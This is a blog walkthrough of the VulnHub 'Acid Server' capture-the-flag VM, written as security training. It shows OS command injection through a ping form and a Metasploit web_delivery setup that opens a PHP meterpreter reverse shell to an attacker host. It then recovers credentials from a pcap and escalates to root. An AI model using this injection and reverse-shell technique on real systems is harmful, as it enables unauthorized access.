<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Acid VM (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-acid-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2016-11-05T13:50:42+00:00">November 5, 2016</time><time class="updated" datetime="2025-06-10T20:30:28+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">The name of the Virtual machine is “Acid Server” that we are going to crack.  It is a Boot2Root VM that we are going to solve. This is a web-based VM. Our main goal is to escalate the privileges to root and capture the flag.</span></p>
<p><span style="color: #000000;">You can download it from à <a style="color: #000000;" href="https://www.vulnhub.com/entry/acid-server,125/">https://www.vulnhub.com/entry/acid-server,125/</a></span></p>
<h3><span style="color: #800000;"><strong>Penetration Methodology:</strong></span></h3>
<ul>
<li><span style="color: #000000;">Network Scanning (Nmap, netdiscover)</span></li>
<li><span style="color: #000000;">Directory Brute-force (dirbuster)</span></li>
<li><span style="color: #000000;">Abusing web page for OS command vulnerability</span></li>
<li><span style="color: #000000;">Exploit OS command vulnerability (Metasploit)</span></li>
<li><span style="color: #000000;">Gain unauthorized access into the victim’s machine</span></li>
<li><span style="color: #000000;">Search and download pcap file</span></li>
<li><span style="color: #000000;">Steal password from inside pcap file (Wireshark)</span></li>
<li><span style="color: #000000;">Get into the shell for privilege escalation</span></li>
<li><span style="color: #000000;">Import python one-liner for proper TTY shell</span></li>
<li><span style="color: #000000;">Switch user (su) and submit the stolen password</span></li>
<li><span style="color: #000000;">Take root access and capture the flag</span></li>
</ul>
<p><span style="color: #000000;">As always start by finding the target.</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-3GPaJ84V6x8/WvA35Ht8mDI/AAAAAAAAWuw/tntrDhVYHQEWCrSbZNLmZzVSUSGzQ78EACLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Our target is <strong>192.168.1.103, </strong>now fire up nmap to scan the ports.</span></p>
<pre class="lang:default decode:true">nmap -p- -A 192.168.1.103</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-bl7cphNQmvg/WvA37TsiQRI/AAAAAAAAWvc/fBhpJ0xA2VcQy-hyATNebS578XJs0NsXACLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Nmap results are showing that there is only one port open i.e. <strong>33447</strong> with the services of <strong>HTTP</strong>. Please observe here that port 80 is not open that means if we want to open this IP in the browser then we have to use the port number as it will not open it by default. So now open the web page using the port number 33447.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FSfVsHiuX5A/WvA37_Dq-1I/AAAAAAAAWvg/xIRRV2tut-gG-M6rYvMI0fm3soF15TTJQCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">There are only a heading and a quote on the page; nothing else but if you look at the tab on the browser, it says “<strong>/Challenge</strong>”. This can be a directory. Let’s open it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wO3Tktkbfyo/WvA378JZ_SI/AAAAAAAAWvk/_HxsSMlEdm4n0uRNq3LuNu4tYDYGfWlogCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Upon opening /Challenge, a login portal will open. Let’s learn more about /Challenge by using <strong>DirBuster</strong>. Copy the link from the browser in Target URL box<strong> </strong>and then select <strong>2.3-medium word list</strong> in Files with the list of dirs/files box by clicking on the browse button. And then click on<strong> Start.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-ksTiIWyasaA/WvA38PusqwI/AAAAAAAAWvo/RQmdPzUo65U9enJ7Xlf3gzjwUWBpcv-TwCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Clicking on start button will provide the list of directories</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-7PazA1wAffI/WvA38SkEseI/AAAAAAAAWvs/RHUBfLlzOzI5YTeDxLFSdcCjNd394TlWgCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">I went through every directory but the only <strong>cake.php</strong> was useful. Open it in the browser. When you open cake.php, the page says <strong>“ah.haan…There is long way to go..dude J”. </strong>But upon looking closely you will find the <strong>/Magic_Box</strong> is written on the tab. Let’s open it in the URL just like before.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_6M5rGIuD9E/WvA38YYazaI/AAAAAAAAWvw/EXFKuNKshAU-gFJtoJyDGYIL0wUrkiJOwCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">When you open the /Magic_Box it says that access to the page is forbidden. OK! There is no problem with that. </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-7FcVqyLMjyY/WvA38pI9OlI/AAAAAAAAWv0/x2emCBtMI8Y4QIC83vaZAfKqXUU1EVtvgCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Let’s use DirBuster again on it. Give the <strong>URL http://192.168.1.103:33447/Challenges/Magic/box</strong> and <strong>2.3 medium wordlists</strong> just as before and then click on start button.</span></p>
<p><span style="color: #000000;">In the result, it will show the name of the directories</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/--Y544_NyzA0/WvA39UnM1fI/AAAAAAAAWv4/qZQBJu019usSQK4aLoZ_S_-vt720xOjbgCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Out of all those <strong>command.php</strong> is the only one that has proved to be useful. Open it in the URL. Here you will find a <strong>ping portal</strong> that means you can ping any IP address from here. Let’s try and ping an IP. (You can ping any IP but I am going to ping the default IP i.e. 127.0.0.1).</span></p>
<p><span style="color: #000000;">Once the IP has been pinged, go to the page source. On the page source, you can contemplate that the results of ping are showing.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Jnu5JEGU4-U/WvA35GBa3pI/AAAAAAAAWu0/3YTGbQl283MkR2oPOcB-d5eBSefgBzCDwCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Hence there are possibilities for OS command Injection and to ensure let’s run any arbitrary command such as; <strong>ls</strong> as shown above. On the page source, you can contemplate that results of <strong>ls command</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-r6bWI1Ly8Kc/WvA35Ea5yuI/AAAAAAAAWu4/tOr7yyssdcE_JfL0EuHU2a2Kf0cVy8IUwCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Since the page is showing the desired result that means we can use this portal to inject our virus using the web_delivery exploit. And to do so, go to the terminal of Kali an open Metasploit by typing <strong>msfconsole </strong>and then further type :</span></p>
<pre class="lang:default decode:true">msf use exploit/multi/script/web_delivery
msf exploit(multi/script/web_delivery) set target 1
msf exploit(multi/script/web_delivery) set payload php/meterpreter/reverse_tcp
msf exploit(multi/script/web_delivery) set lhost 192.168.1.108
msf exploit(multi/script/web_delivery) set lport 4444
msf exploit(multi/script/web_delivery) exploit</pre>
<p><span style="color: #000000;">This exploit is a multi-exploit that means it can be used on multiple programs. Therefore, I have set the target as one because 1 refers to php and as we are using php payload we have to set the target as 1.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-qgHUTPmvqfw/WvA359EfSuI/AAAAAAAAWu8/H-DY3IoPmrolaj3nLhUYHAFdodp0unqnACLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Now performing this exploit will give you a code. Copy this code and paste it on the ping portal after the IP that you are using to ping. And to add this code use semi-colon (;).</span></p>
<p><span style="color: #000000;"><strong>127.0.0.1; *&lt;code&gt;*</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-D-xHixuzrRY/WvA35_TLVUI/AAAAAAAAWvA/0EVfnfZ2uJscb-bFLSaJfVMp54OCJHsBwCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">As soon as you click on submit, you will have a meterpreter session in Metasploit. Further type the following command to see the list of directories:</span></p>
<pre class="lang:default decode:true">ls / l</pre>
<p><span style="color: #000000;">In the list, you will find a directory called <strong>s.bin. </strong>Let’s go into the folder and see its list of files and for that type:</span></p>
<pre class="lang:default decode:true">cd /s.bin
ls</pre>
<p><span style="color: #000000;">Here, you will find a php file. Let’s read it.</span></p>
<pre class="lang:default decode:true">cat invesgitate.php</pre>
<p><span style="color: #000000;">When you read it, it shows you a message i.e. <strong>“now you have to behave like an investigator to catch the culprit”.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-0flm7l0i_rs/WvA36HlqiOI/AAAAAAAAWvE/d0FA8tp0DxQjQR3WknpKWU0CsQwCMywjQCLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">In the list of the directory that was previously previewed also had a folder sbin. Let’s get into that folder and see the lists of files and to do so type:</span></p>
<pre class="lang:default decode:true">cd s.bin
ls</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DKvmHsi37ak/WvA36a_HhFI/AAAAAAAAWvI/AaXva75HTDYaaMAyMYLykVQXQHzYeWI7wCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">In the list of files, you can see a file named <strong>raw_vs_isi</strong>. Let’s check it out.</span></p>
<pre class="lang:default decode:true">cd raw_vs_isi
ls</pre>
<p><span style="color: #000000;">It contains only one file, called <strong>hint.pcapng. </strong>Let’s download it on our desktop with help of the following command.</span></p>
<pre class="lang:default decode:true">download hint.pcapng /root/Desktop</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rMd4GSiOQyA/WvA36h1OQjI/AAAAAAAAWvM/-U8ajNetTUMvU8gGYQEhEN6hboEEX5rUgCLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Now the file is downloaded on your desktop. I explored it every packet and found a conversation in the TCP stream of the 90<sup>th</sup> packet. Just <strong>right-click</strong> on the said packet and then click on <strong>Follow</strong> option and then select <strong>TCP stream</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-4rSG1Z_o0c0/WvA36q-mLNI/AAAAAAAAWvQ/jGccVnGAfiwlxVWzaBYqdz3iCs9s_gs4QCLcBGAs/s1600/17.png"/></span></p>
<p><span style="color: #000000;">It will open the conversation as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-jidax8mHI60/WvA36-2vK1I/AAAAAAAAWvU/oa83oRMH_lc4y8XSeNQC5hZehk2seiksgCLcBGAs/s1600/18.png"/></span></p>
<p><span style="color: #000000;">In the conversation, one of them says <strong>“saman and nowadays he’s known by the alias of 1337hax0r” </strong>that means saman is the username and 1337hax0r can be the password. Let’s try it. Then to access proper TTY shell we had import python one line script and Type following command to reach the terminal and here log in with the username we just found:</span></p>
<pre class="lang:default decode:true">shell
python -c 'import pty;pty.spawn("/bin/bash")'
su saman
1337hax0r
sudo su
1337hax0r</pre>
<p><span style="color: #000000;">And so you have entered the root. Now go into the folder root and see what it has to offer:</span></p>
<pre class="lang:default decode:true">cd /root
ls
cat flag.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Kw8Ioot10RA/WvA37G6izhI/AAAAAAAAWvY/Xukwsjon9YEeZyeWqQjPnkoYahbHVl6JwCLcBGAs/s1600/19.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <strong><a class="broken_link" style="color: #000000;" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
